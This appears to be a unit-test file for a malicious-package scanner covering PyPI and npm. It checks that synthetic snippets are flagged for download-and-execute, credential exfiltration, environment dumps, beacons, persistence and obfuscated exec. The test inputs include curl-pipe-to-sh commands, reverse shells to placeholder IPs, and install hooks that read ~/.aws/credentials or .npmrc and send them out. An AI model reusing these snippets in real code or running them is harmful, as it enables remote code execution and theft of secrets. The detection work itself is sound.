"""Behavior analysis (guard/behavior): rebuilt values and data flow judged by rules/behavior.json.
run: python3 tests/test_behavior.py. Synthetic snippets only (no real malware is copied); nothing is executed."""
import json
import sys
import tempfile
import types
import unittest
from pathlib import Path

GUARD = Path(__file__).resolve().parents[1] / "guard"
sys.path.insert(0, str(GUARD))
import behavior  # noqa: E402
from behavior import js  # noqa: E402
from sources import npm  # noqa: E402


def py_package(files: dict, sdist: bool = False) -> list[Path]:
    root = Path(tempfile.mkdtemp())
    root = root / "pkg-1.0.tar.gz.unpacked" / "pkg-1.0" if sdist else root / "pkg-1.0-py3-none-any.whl.unpacked"
    for rel, text in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
    return sorted(root.rglob("*"))


def py_facts(files: dict, sdist: bool = False) -> set:
    """{(finding, phase)} of a Python package (wheel layout, or an sdist with its root setup.py)."""
    feats = types.SimpleNamespace(ecosystem="pypi", install_time_files=[], evidence=[])
    ctx = behavior.analyze_files(py_package(files, sdist), feats)
    return {(f, ph) for (f, ph, _file, _line) in ctx.facts}


def mod(src: str) -> set:
    return py_facts({"pkg/__init__.py": src})


def setup(src: str) -> set:
    return py_facts({"setup.py": src + "\nfrom setuptools import setup\nsetup(name='pkg')\n"}, sdist=True)


class PyValues(unittest.TestCase):
    def test_command_through_variables(self):
        self.assertIn(("download_exec", "install"),
                      setup("import os\nhost = 'http://203.0.113.9'\nc = 'cu' + 'rl ' + host + '/x.sh'\nc += ' | sh'\nos.system(c)\n"))
        got = mod("import subprocess\ndef run(cmd):\n    subprocess.call(cmd, shell=True)\n"
                  "parts = ['wget -qO- http://198.51.100.7/a', 'bash']\nrun(' | '.join(parts))\n")
        self.assertIn(("download_exec", "import"), got)               # the local function is called with its argument
        got = mod("import os\nurl = input()\nos.system(f'curl {url} | sh')\n")
        self.assertIn(("download_exec", "import"), got)               # unknown URL, but the partial command still reads

    def test_escaped_names(self):
        got = mod("import builtins\nf = getattr(builtins, '\\x65\\x78\\x65\\x63')\nf(unpack('k1x9qqZm9vYmFyYmF6cXV4cXV1eGNvcmdl'))\n")
        self.assertIn(("hidden_call", "import"), got)
        self.assertIn(("unreadable_exec", "import"), got)          # made from a constant by code that was not read
        got = mod("import builtins\nf = getattr(builtins, '\\x65\\x78\\x65\\x63')\nf(code_from_somewhere)\n")
        self.assertNotIn(("unreadable_exec", "import"), got)       # data, not a hidden constant
        self.assertIn(("hidden_call", "import"), mod("__builtins__.__dict__['ex' + 'ec'](payload)\n"))

    def test_getattr_assembly(self):
        got = mod("import os\nname = ''.join(['sys', 'tem'])\ngetattr(os, name)('curl http://198.51.100.7/a | sh')\n")
        self.assertIn(("hidden_call", "import"), got)
        self.assertIn(("download_exec", "import"), got)
        got = mod("m = __import__('o' + 's')\nm.popen('wget http://198.51.100.7/p -O /tmp/p; sh /tmp/p')\n")
        self.assertIn(("hidden_call", "import"), got)
        self.assertIn(("download_exec", "import"), got)

    def test_decode_then_exec(self):
        # unknown blob: judged by its tag
        self.assertIn(("decode_exec", "import"),
                      mod("import base64, zlib\nBLOB = 'eJzz' + 'SM3JyVcozy-'\nexec(zlib.decompress(base64.b64decode(BLOB)))\n"))
        # known blob: decoded and read again - here it fetches and runs a script
        import base64
        inner = base64.b64encode(b"import os\nos.system('curl -s http://198.51.100.7/s | sh')\n").decode()
        self.assertIn(("download_exec", "import"), mod(f"import base64\nexec(base64.b64decode('{inner}'))\n"))
        codes = [ord(c) for c in "import socket,getpass,requests\nrequests.post('https://x.oastify.com', data=getpass.getuser())"]
        got = mod(f"exec(''.join(chr(c) for c in {codes}))\n")
        self.assertIn(("suspicious_send", "import"), got)
        self.assertIn(("decode_exec", "import"),
                      mod("import marshal, base64\nB = 'YwAAAAAAAAAA'\nexec(marshal.loads(base64.b64decode(B)))\n"))

    def test_decoded_but_harmless(self):
        import base64
        inner = base64.b64encode(b"x = 1 + 1\n").decode()
        self.assertEqual(mod(f"import base64\nexec(base64.b64decode('{inner}'))\n"), set())


class PyFlow(unittest.TestCase):
    def test_credential_read_then_send(self):
        got = mod("import os, requests\n"
                  "p = os.path.join(os.path.expanduser('~'), '.aws', 'credentials')\n"
                  "with open(p) as f:\n    data = f.read()\n"
                  "requests.post('https://example.com/u', data={'k': data})\n")
        self.assertIn(("secret_exfil", "import"), got)
        got = mod("import os, json, urllib.request\n"
                  "def grab():\n    return json.dumps(dict(os.environ)).encode()\n"
                  "def send():\n    urllib.request.urlopen('https://example.com/e', data=grab())\n")
        self.assertIn(("secret_exfil", "call"), got)                   # whole environment, even inside a function

    def test_sysinfo_beacon(self):
        got = setup("import socket, getpass, urllib.request\n"
                    "u = 'http://telemetry.example/?h=' + socket.gethostname() + '&u=' + getpass.getuser()\n"
                    "urllib.request.urlopen(u)\n")
        self.assertIn(("sysinfo_beacon", "install"), got)
        got = mod("import os, requests\nrequests.get('https://abc.oastify.com', params={'u': os.getlogin()})\n")
        self.assertIn(("suspicious_send", "import"), got)
        got = mod("import socket, platform\nsocket.gethostbyname(platform.node() + '.x.oast.fun')\n")
        self.assertIn(("suspicious_send", "import"), got)              # data in a DNS name

    def test_autostart_write(self):
        got = mod("import os\nwith open(os.path.expanduser('~/.bashrc'), 'a') as f:\n    f.write('python3 -m pkg &')\n")
        self.assertIn(("persistence", "import"), got)
        got = mod("import winreg\n"
                  "k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, 2)\n"
                  "winreg.SetValueEx(k, 'upd', 0, winreg.REG_SZ, 'C:\\\\x.exe')\n")
        self.assertIn(("persistence", "import"), got)

    def test_download_write_run(self):
        got = mod("import requests, subprocess, tempfile, os\n"
                  "r = requests.get('https://198.51.100.7/a.bin')\n"
                  "f = tempfile.NamedTemporaryFile(delete=False)\nf.write(r.content)\nf.close()\n"
                  "os.chmod(f.name, 0o755)\nsubprocess.Popen([f.name])\n")
        self.assertIn(("download_exec", "import"), got)
        self.assertIn(("download_exec", "import"),
                      mod("import requests\nexec(requests.get('https://198.51.100.7/p').text)\n"))

    def test_remote_shell(self):
        got = mod("import socket, os, pty\ns = socket.socket()\ns.connect(('198.51.100.7', 4444))\n"
                  "for fd in (0, 1, 2):\n    os.dup2(s.fileno(), fd)\npty.spawn('/bin/sh')\n")
        self.assertIn(("remote_shell", "import"), got)


class PyPhases(unittest.TestCase):
    def test_setup_cmdclass_runs_at_install(self):
        got = setup("from setuptools.command.install import install\nimport subprocess\n"
                    "class I(install):\n    def run(self):\n"
                    "        subprocess.call(['curl', '-o', '/tmp/p', 'http://198.51.100.7/p'])\n"
                    "        subprocess.call(['sh', '/tmp/p'])\n")
        self.assertIn(("download_exec", "install"), got)
        self.assertIn(("install_process", "install"), got)

    def test_function_called_from_other_module(self):
        got = py_facts({"pkg/__init__.py": "from .core import go\ngo()\n",
                        "pkg/core.py": "import os\ndef go():\n    os.system('curl http://198.51.100.7/a | sh')\n"})
        self.assertEqual(got, {("download_exec", "import")})

    def test_uncalled_function_is_call_phase(self):
        got = mod("import os\ndef go():\n    os.system('curl http://198.51.100.7/a | sh')\n")
        self.assertEqual(got, {("download_exec", "call")})

    def test_thread_target_runs_at_import(self):
        got = mod("import threading, os\ndef go():\n    os.system('curl http://198.51.100.7/a | sh')\n"
                  "threading.Thread(target=go).start()\n")
        self.assertIn(("download_exec", "import"), got)

    def test_startup_files(self):
        got = py_facts({"evil.pth": "import os; exec(os.environ.get('X', ''))\n"})
        self.assertIn(("unreadable_exec", "interpreter_start"), got)
        got = py_facts({"sitecustomize.py": "import urllib.request\nexec(urllib.request.urlopen('http://198.51.100.7/x').read())\n"})
        self.assertIn(("download_exec", "interpreter_start"), got)

    def test_main_block_is_not_import(self):
        got = mod("import os\nif __name__ == '__main__':\n    os.system('curl http://198.51.100.7/a | sh')\n")
        self.assertEqual(got, {("download_exec", "command")})
        got = py_facts({"pkg/__main__.py": "import os\nos.system('curl http://198.51.100.7/a | sh')\n"})
        self.assertEqual(got, {("download_exec", "command")})

    def test_tests_and_nested_setup_skipped(self):
        self.assertEqual(py_facts({"pkg/tests/test_x.py": "import os\nos.system('curl http://x/a | sh')\n"}), set())
        self.assertEqual(py_facts({"setup.py": "from setuptools import setup\nsetup()\n",
                                   "tools/setup.py": "import os\nos.system('curl http://x/a | sh')\n"}, sdist=True), set())


class PyNormal(unittest.TestCase):
    def test_version_file_exec(self):
        self.assertEqual(setup("import os\nhere = os.path.dirname(os.path.abspath(__file__))\nns = {}\n"
                               "exec(open(os.path.join(here, 'pkg', 'version.py')).read(), ns)\n"), set())
        self.assertEqual(setup("from pathlib import Path\n"
                               "exec((Path(__file__).parent / 'pkg' / '_version.py').read_text())\n"), set())

    def test_git_describe(self):
        self.assertEqual(setup("import subprocess\n"
                               "v = subprocess.check_output(['git', 'describe', '--tags']).decode().strip()\n"), set())

    def test_build_commands_in_setup(self):
        self.assertEqual(setup("import subprocess, sys\nsubprocess.check_call(['cmake', '..'])\n"
                               "subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cython'])\n"), set())

    def test_sdk_sends_its_api_key(self):
        self.assertEqual(mod("import os, requests\nKEY = os.environ['ANTHROPIC_API_KEY']\n"
                             "requests.get('https://api.anthropic.com/v1/models', headers={'x-api-key': KEY})\n"), set())
        self.assertEqual(mod("import os, httpx\nclass C:\n    def __init__(self):\n"
                             "        self.key = os.getenv('OPENAI_API_KEY')\n"
                             "        self.http = httpx.Client(base_url='https://api.openai.com')\n"
                             "    def ask(self, q):\n        return self.http.post('/v1/x', json={'q': q},"
                             " headers={'Authorization': 'Bearer ' + self.key})\n"), set())

    def test_secret_env_to_suspicious_host(self):
        self.assertIn(("secret_exfil", "import"),
                      mod("import os, requests\nrequests.post('https://hooks.slack.com/services/T/B/x',"
                          " json={'t': os.environ['GITHUB_TOKEN']})\n"))

    def test_setup_imports_and_cmdclass(self):
        files = {"setup.py": "from setuptools import setup\nfrom helpers import Build\nimport helpers\n"
                             "setup(name='pkg', cmdclass={'build_py': Build})\n",
                 "helpers.py": "import os\nclass Build:\n    def run(self):\n        os.system('curl http://198.51.100.7/a | sh')\n"
                               "def unused():\n    os.system('wget http://198.51.100.7/b | sh')\n"}
        got = py_facts(files, sdist=True)
        self.assertIn(("download_exec", "install"), got)               # the command class runs at install
        self.assertEqual({p for f, p in got if f == "download_exec"}, {"install", "call"})   # unused(): when called

    def test_short_constant_lookups_are_not_opaque(self):
        self.assertEqual(mod("import importlib.util, sys\nspec = importlib.util.find_spec('_strptime')\n"
                             "code = spec.loader.get_code('_strptime')\nexec(code, {})\n"), set())

    def test_decoding_runtime_data_is_serialization(self):
        # a cache entry, a database value, a .pyc: decoded data, not a hidden blob (django, sqlalchemy, pytest)
        self.assertEqual(mod("import pickle, base64, zlib, marshal\n"
                             "def get(value):\n    return pickle.loads(base64.b64decode(value.encode()))\n"
                             "def load(f):\n    return pickle.loads(zlib.decompress(f.read()))\n"
                             "def run(fn, module):\n    with open(fn, 'rb') as f:\n        co = marshal.loads(f.read()[16:])\n"
                             "    exec(co, module.__dict__)\n"), set())

    def test_environment_copy_read_by_name(self):
        self.assertEqual(mod("import os, urllib.request\n"
                             "def probe(env=None):\n    e = env if env is not None else dict(os.environ)\n"
                             "    token = e.get('IMDS_TOKEN', '')\n"
                             "    req = urllib.request.Request('http://169.254.169.254/x', headers={'t': token})\n"
                             "    return urllib.request.urlopen(req).read()\n"), set())
        self.assertIn(("secret_exfil", "call"),
                      mod("import os, requests\ndef f():\n    e = os.environ.copy()\n"
                          "    requests.post('https://example.com', json=e)\n"))

    def test_config_eval_of_env_var(self):
        self.assertEqual(mod("import os\nDEBUG = eval(os.getenv('PKG_DEBUG', 'False'))\n"), set())

    def test_compat_code(self):
        self.assertEqual(mod("import sys\nexec_ = getattr(__import__('builtins'), 'exec')\n"
                             "exec_('def reraise(tp, value, tb=None):\\n    raise value')\n"
                             "import textwrap\nexec(textwrap.dedent('''\n    def f():\n        return 1\n'''))\n"), set())

    def test_python2_syntax_is_read(self):
        got = setup("import os\nprint 'building'\nos.system('curl http://198.51.100.7/a | sh')\n")
        self.assertIn(("download_exec", "install"), got)

    def test_limits_never_raise(self):
        huge = "x = 'a'\n" + "x = x + x\n" * 40 + "exec(x)\n"
        feats = types.SimpleNamespace(ecosystem="pypi", install_time_files=[], evidence=[])
        ctx = behavior.analyze_files(py_package({"pkg/__init__.py": huge, "pkg/bad.py": "def (:\n"}), feats)
        self.assertIn(("pkg/bad.py", "syntax error"), ctx.not_analyzed)
        deep = "x = " + "+".join(["'a'"] * 20000) + "\nimport os\nos.system('curl http://198.51.100.7/a | sh')\n"
        self.assertIn(("download_exec", "import"), mod(deep))


class Verdict(unittest.TestCase):
    """The facts reach the verdict through ScanFeatures and the two hard rules."""

    def scan(self, files, sdist=False):
        import scan_engine as se
        f = se.ScanFeatures(name="pkg", version="1.0")
        return se.scan_files(py_package(files, sdist), f)

    def test_block_and_review(self):
        v = self.scan({"pkg/__init__.py": "import requests\nexec(requests.get('https://198.51.100.7/p').text)\n"})
        self.assertEqual(v.verdict, "BLOCK")
        self.assertTrue(v.features.behavior_block)
        self.assertTrue(any("behavior check: " in r and "downloaded" in r.lower() for r in v.reasons), v.reasons)
        ev = next(e for e in v.features.evidence if e["rule"] == "download_exec")
        self.assertEqual((ev["phase"], ev["action"], ev["file"]), ("import", "block", "pkg/__init__.py"))
        v = self.scan({"pkg/__init__.py": "import builtins\ngetattr(builtins, 'ev' + 'al')('1 + 1')\n"})
        self.assertTrue(v.features.behavior_review and not v.features.behavior_block)
        self.assertNotEqual(v.verdict, "ALLOW")
        v = self.scan({"pkg/__init__.py": "import os\ndef f():\n    print(os.getcwd())\n"})
        self.assertFalse(v.features.behavior_block or v.features.behavior_review)

    def test_report_names_the_fact(self):
        import review_report
        v = self.scan({"pkg/__init__.py": "import requests\nexec(requests.get('https://198.51.100.7/p').text)\n"})
        rec = review_report.package_record("pkg", "1.0", v)
        self.assertIn("downloaded", json.dumps(rec, ensure_ascii=False).lower())


# ------------------------------------------------------------------------------------------------ JavaScript (guard/behavior/js.py)

def npm_package(files: dict, scripts: dict | None = None) -> tuple[list[Path], list[str]]:
    """An unpacked npm tarball (<tmp>/pkg-1.0.tgz.unpacked/package/...) plus its lifecycle files, as sources/npm does."""
    tmp = Path(tempfile.mkdtemp())
    root = tmp / "pkg-1.0.tgz.unpacked" / "package"
    files = dict(files)
    files["package.json"] = json.dumps({"name": "pkg", "version": "1.0", "scripts": scripts or {}})
    for rel, text in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
    out = sorted(p for p in root.rglob("*") if p.is_file())
    install_files = npm.install_time_files(out)
    out += npm.write_lifecycle(out, tmp, "pkg")
    return out, install_files


def js_facts(files: dict, scripts: dict | None = None) -> set:
    """{(finding, phase)} - the JS / shell part of behavior.analyze_files, without the Python front end."""
    paths, install_files = npm_package(files, scripts)
    feats = types.SimpleNamespace(ecosystem="npm", install_time_files=install_files, evidence=[])
    ctx = behavior.Context()
    for path, rel, lang, phase in behavior.plan(paths, feats):
        text = path.read_text()
        if lang == "js":
            js.analyze_source(ctx, text, rel, phase)
        elif lang == "shell":
            ctx.shell(text, phase, rel, 1)
    return {(f, ph) for (f, ph, _file, _line) in ctx.facts}


def js_code(src: str) -> set:
    return js_facts({"index.js": src})


class JSValues(unittest.TestCase):
    def test_command_through_variables(self):
        got = js_code("const cp = require('child_process');\n"
                   "const host = 'http://203.0.113.9';\n"
                   "let c = 'cu' + 'rl ' + host + '/x.sh';\n"
                   "c += ' | sh';\n"
                   "cp.execSync(c);\n")
        self.assertIn(("download_exec", "import"), got)

    def test_destructured_and_esm_imports(self):
        got = js_code("const { exec: run } = require('node:child_process');\n"
                   "run(['curl http://198.51.100.7/p', 'bash'].join(' | '));\n")
        self.assertIn(("download_exec", "import"), got)
        got = js_code("import { execSync } from 'child_process';\n"
                   "execSync(`wget -qO- http://198.51.100.7/a | sh`);\n")
        self.assertIn(("download_exec", "import"), got)

    def test_assembled_and_escaped_names(self):
        got = js_code("global['ev' + 'al'](unpack('k1x9qqZm9vYmFyYmF6cXV4cXV1eGNvcmdl'));\n")
        self.assertIn(("hidden_call", "import"), got)
        self.assertIn(("unreadable_exec", "import"), got)
        got = js_code("const g = globalThis; g['\\x65\\x76\\x61\\x6c'](x);\n")
        self.assertIn(("hidden_call", "import"), got)
        got = js_code("const m = require('child_' + 'process'); m.exec(cmd);\n")
        self.assertIn(("hidden_call", "import"), got)
        got = js_code("const n = ['l', 'a', 'v', 'e'].reverse().join(''); global[n]('1');\n")
        self.assertIn(("hidden_call", "import"), got)
        self.assertNotIn(("unreadable_exec", "import"), got)      # '1' was recovered and read: nothing to run

    def test_decode_then_eval(self):
        import base64
        payload = base64.b64encode(b"require('child_process').exec('curl http://203.0.113.5/s | sh')").decode()
        got = js_code(f"const s = Buffer.from('{payload}', 'base64').toString();\neval(s);\n")
        self.assertIn(("download_exec", "import"), got)          # the decoded code itself was read
        got = js_code("const d = Buffer.from(unpack('k1x9qqZm9vYmFyYmF6cXV4cXV1eGNvcmdl'), 'base64').toString('utf8');\neval(d);\n")
        self.assertIn(("decode_exec", "import"), got)            # a constant turned into code by unread code
        got = js_code("const d = Buffer.from(process.argv[2], 'base64').toString('utf8');\neval(d);\n")
        self.assertNotIn(("decode_exec", "import"), got)         # decoding data handed in is not hiding a blob
        got = js_code("const blob = unpack('k1x9qqZm9vYmFyYmF6cXV4cXV1eGNvcmdl');\nconst s = String.fromCharCode(...[101,118,97,108]);\n"
                      "global[s](atob(blob));\n")
        self.assertIn(("decode_exec", "import"), got)
        self.assertIn(("hidden_call", "import"), got)

    def test_function_constructor_and_vm(self):
        got = js_code("const vm = require('vm');\nconst x = unpack('k1x9qqZm9vYmFyYmF6cXV4cXV1eGNvcmdl');\n"
                      "vm.runInThisContext(Buffer.from(x, 'hex').toString());\n")
        self.assertIn(("decode_exec", "import"), got)
        got = js_code("const data = unpack('k1x9qqZm9vYmFyYmF6cXV4cXV1eGNvcmdl');\nnew Function(atob(data))();\n")
        self.assertIn(("decode_exec", "import"), got)


class JSFlow(unittest.TestCase):
    def test_credential_read_then_send(self):
        got = js_code("const fs = require('fs'), os = require('os'), path = require('path'), https = require('https');\n"
                   "const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');\n"
                   "const req = https.request({hostname: 'example.org', path: '/c', method: 'POST'});\n"
                   "req.write(npmrc);\nreq.end();\n")
        self.assertIn(("secret_exfil", "import"), got)

    def test_whole_environment_sent(self):
        got = js_code("fetch('https://example.net/e', {method: 'POST', body: JSON.stringify(process.env)});\n")
        self.assertIn(("secret_exfil", "import"), got)

    def test_sysinfo_beacon(self):
        got = js_code("const os = require('os'), https = require('https');\n"
                   "const d = {h: os.hostname(), u: os.userInfo().username};\n"
                   "https.get('https://example.org/t?d=' + encodeURIComponent(JSON.stringify(d)));\n")
        self.assertIn(("sysinfo_beacon", "import"), got)
        got = js_code("const os = require('os');\n"
                   "fetch(`https://abc.oastify.com/${os.hostname()}`);\n")
        self.assertIn(("suspicious_send", "import"), got)
        got = js_code("const dns = require('dns'), os = require('os');\n"
                   "dns.lookup(os.hostname() + '.x.example', () => {});\n")
        self.assertIn(("sysinfo_beacon", "import"), got)

    def test_autostart_write(self):
        got = js_code("const fs = require('fs'), os = require('os');\n"
                   "fs.appendFileSync(os.homedir() + '/.bashrc', '\\nnode ~/.x.js &\\n');\n")
        self.assertIn(("persistence", "import"), got)

    def test_download_write_run(self):
        got = js_code("const https = require('https'), fs = require('fs'), { spawn } = require('child_process');\n"
                   "https.get('https://example.org/tool', res => {\n"
                   "  const f = fs.createWriteStream('/tmp/tool');\n"
                   "  res.pipe(f);\n"
                   "  f.on('finish', () => { fs.chmodSync('/tmp/tool', 0o755); spawn('/tmp/tool', [], {detached: true}); });\n"
                   "});\n")
        self.assertIn(("download_exec", "import"), got)
        got = js_code("const axios = require('axios');\n"
                   "axios.get('https://example.org/x.js').then(r => eval(r.data));\n")
        self.assertIn(("download_exec", "import"), got)

    def test_reverse_shell(self):
        got = js_code("const net = require('net'), cp = require('child_process');\n"
                   "const sh = cp.spawn('/bin/sh', []);\n"
                   "const c = new net.Socket();\n"
                   "c.connect(4444, '198.51.100.3', () => { c.pipe(sh.stdin); sh.stdout.pipe(c); });\n")
        self.assertIn(("remote_shell", "import"), got)


class JSPhases(unittest.TestCase):
    def test_install_script_runs_file(self):
        src = "require('child_process').execSync('curl -s http://203.0.113.4/i.sh | bash');\n"
        got = js_facts({"install.js": src}, {"postinstall": "node install.js"})
        self.assertIn(("download_exec", "install"), got)
        got = js_facts({"lib/x.js": src})
        self.assertIn(("download_exec", "import"), got)

    def test_lifecycle_inline_node_code(self):
        got = js_facts({}, {"preinstall": "node -e \"require('child_process').exec('wget -qO- http://203.0.113.4/a|sh')\""})
        self.assertIn(("download_exec", "install"), got)

    def test_lifecycle_beacon(self):
        got = js_facts({}, {"preinstall": "curl \"http://203.0.113.8/?u=$(whoami)&h=$(hostname)\""})
        self.assertIn(("suspicious_send", "install"), got)

    def test_install_process(self):
        got = js_facts({"setup.js": "require('child_process').execSync('wmic process list');\n"},
                    {"install": "node setup.js"})
        self.assertIn(("install_process", "install"), got)

    def test_function_never_called_is_call_phase(self):
        got = js_code("const cp = require('child_process');\n"
                   "function update() { cp.execSync('curl https://example.org/u.sh | sh'); }\n"
                   "module.exports = { update };\n")
        self.assertIn(("download_exec", "call"), got)
        self.assertNotIn(("download_exec", "import"), got)
        pol = behavior.Context().pol
        self.assertEqual(pol.action("download_exec", "call"), "review")

    def test_called_function_and_iife_and_callbacks_are_import(self):
        got = js_code("const cp = require('child_process');\n"
                   "function go(u) { cp.exec('curl ' + u + ' | sh'); }\n"
                   "(function () { go('https://example.org/a'); })();\n")
        self.assertIn(("download_exec", "import"), got)
        got = js_code("setTimeout(() => require('child_process').exec('curl http://203.0.113.1/z | sh'), 1000);\n")
        self.assertIn(("download_exec", "import"), got)

    def test_tests_folder_skipped(self):
        got = js_facts({"test/run.js": "eval(Buffer.from(x, 'base64').toString());\n"})
        self.assertEqual(got, set())


class JSNormal(unittest.TestCase):
    def test_sdk_sends_its_key_to_its_api(self):
        got = js_code("const key = process.env.OPENAI_API_KEY;\n"
                   "async function ask(q) {\n"
                   "  const r = await fetch('https://api.openai.com/v1/chat', {method: 'POST',\n"
                   "    headers: {Authorization: `Bearer ${key}`}, body: JSON.stringify({q})});\n"
                   "  return r.json();\n"
                   "}\nmodule.exports = { ask };\n")
        self.assertEqual(got, set())

    def test_package_local_reads(self):
        got = js_code("const fs = require('fs'), path = require('path');\n"
                   "const pkg = require('./package.json');\n"
                   "const tpl = fs.readFileSync(path.join(__dirname, 'templates', 'a.txt'), 'utf8');\n"
                   "module.exports = () => tpl.replace('{v}', pkg.version);\n")
        self.assertEqual(got, set())

    def test_global_this_idiom(self):
        got = js_code("var g = new Function('return this')();\nvar h = (0, eval)('this');\n")
        self.assertEqual(got, set())

    def test_quoted_data_in_generated_code(self):
        # d3's csv parser: fetched column names pasted into a function body through JSON.stringify are literals
        got = js_code("fetch('https://example.com/a.csv').then(r => r.text()).then(t => {\n"
                      "  const cols = t.split(',');\n"
                      "  const f = new Function('d', 'return {' + cols.map((c, i) => JSON.stringify(c) + ': d[' + i + ']').join(',') + '}');\n"
                      "});\n")
        self.assertNotIn(("download_exec", "import"), got)

    def test_platform_binary_with_arguments(self):
        got = js_code("const cp = require('child_process');\nconst bin = resolveBinary('esbuild');\n"
                      "cp.spawn(bin, ['--service=0.28', '--ping']);\n")
        self.assertNotIn(("unreadable_exec", "import"), got)

    def test_eval_of_constant_json(self):
        got = js_code("const cfg = eval('(' + '{\"a\": 1}' + ')');\n")
        self.assertEqual(got, set())

    def test_build_tool_at_install(self):
        got = js_facts({"install.js": "const { execSync } = require('child_process');\n"
                                   "execSync('node-gyp rebuild');\nexecSync('npm run build');\n"},
                    {"install": "node install.js"})
        self.assertEqual(got, set())

    def test_platform_binary_download_not_run(self):
        got = js_facts({"install.js": "const https = require('https'), fs = require('fs');\n"
                                   "https.get(`https://registry.npmjs.org/pkg-${process.platform}/-/x.tgz`, res => {\n"
                                   "  res.pipe(fs.createWriteStream('bin.tgz'));\n});\n"},
                    {"postinstall": "node install.js"})
        self.assertEqual(got, set())

    def test_minified_and_odd_syntax_does_not_raise(self):
        src = ("!function(e,t){'object'==typeof exports?module.exports=t():e.x=t()}(this,function(){"
               "var a=/[a-z]+\\/x/gi,b=1/2/3,c=`t${1+{a:1}.a}`;class K extends Object{#p=1;static s(){return a}}"
               "for(const [k,v] of Object.entries({q:1})){}label:for(;;){break label}"
               "return {a,b,c,async *g(){yield* [1]}, get z(){return 1}}});\n"
               "@@@ garbage ) ] } {{ \n var ok = 1;")
        got = js_code(src)
        self.assertEqual(got, set())

    def test_limits(self):
        ctx = behavior.Context()
        ctx.limits = dict(ctx.limits, max_steps=50)
        with self.assertRaises(behavior.LimitExceeded):
            js.analyze_source(ctx, "var a = 1;\n" * 200, "index.js", "import")


if __name__ == "__main__":
    unittest.main(verbosity=1)
